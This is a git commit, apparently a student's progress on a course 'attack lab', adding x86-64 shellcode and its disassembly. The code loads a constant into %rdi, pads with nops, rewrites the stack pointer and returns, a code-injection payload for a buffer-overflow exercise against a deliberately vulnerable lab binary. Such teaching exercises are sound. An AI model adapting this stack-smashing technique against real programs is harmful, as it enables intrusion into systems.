6762f3fb152e58314a50a3c0d9626f419fffab39
Linh Tran <litran11794@unm.edu>
2016-10-14 15:49:24 -0600

    Add attack lab progress

---
+++ attackLab/target35/example.d
@@ -0,0 +1,15 @@
+
+example.o:     file format elf64-x86-64
+
+
+Disassembly of section .text:
+
+0000000000000000 <.text>:
+   0:	48 c7 c7 e4 1e cd 30 	mov    $0x30cd1ee4,%rdi
+   7:	90                   	nop
+   8:	90                   	nop
+   9:	90                   	nop
+   a:	90                   	nop
+   b:	48 c7 c4 d8 18 40 00 	mov    $0x4018d8,%rsp
+  12:	48 c7 c4 18 e9 63 55 	mov    $0x5563e918,%rsp
+  19:	c3                   	retq   
---
+++ attackLab/target35/example.s
@@ -0,0 +1,9 @@
+mov 	$0x30cd1ee4, %rdi
+nop
+nop
+nop
+nop
+mov	$0x4018d8,   %rsp	
+mov	$0x5563e918, %rsp
+retq
+
